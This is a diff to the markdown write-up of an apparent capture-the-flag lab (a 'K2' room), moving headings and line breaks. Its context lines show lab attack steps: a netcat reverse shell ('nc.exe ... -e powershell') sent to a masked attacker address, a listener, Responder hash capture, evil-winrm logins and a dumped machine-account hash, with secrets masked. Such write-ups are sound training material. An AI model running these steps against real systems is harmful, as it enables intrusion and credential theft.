@@ -178,6 +178,7 @@ j.smith
 2025/09/30 xx:xx:xx >  [+] VALID USERNAME:	 j.smith@k2.thm
 ```
 
+<br>
 <h1 align="center">Shell as <strong>j.smith</strong></h1>
 <p align="center">The hash identified for Administrator in Task 2 (••••••••••••••••••••••••••••••••) allowed to obtain shell.</p>
 
@@ -353,8 +354,7 @@ C:\Windows\System32\Tasks\nc.exe xx.xxx.xxx.xxx 1234 -e powershell
 ```
 
 <br>
-<br>
-<br>
+<h1 align="center">Shell as <strong>o.armstrong</strong></h1>
 
 ```bash
 :~/K2# nc -nlvp 1234
@@ -415,7 +415,6 @@ PS C:\Windows\system32>
 <br>
 <br>
 <br>
-
 <p align="center">Set up a Responder to capture o.armstrong´s hash.</p>
 
 ```bash
@@ -445,8 +444,6 @@ PS C:\Windows\system32> dir \\xx.xxx.xxx.xxx\test\
 ...
 ⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃      (o.armstrong)
 ```
-
-<h1 align="center">Shell as <strong>o.armstrong</strong></h1>
 
 ```bash
 :~/K2# evil-winrm -i K2RootDC.k2.thm -u 'o.armstrong' -p '⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃'
@@ -572,6 +569,7 @@ RESEARCHER$:1119:aad3b435b51404eeaad3b435b51404ee:⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃
 [*] Cleaning up... 
 ```
 
+<br>
 <h1 align="center">Shell as <strong>Administrator</strong></h1>
 
 ```bash
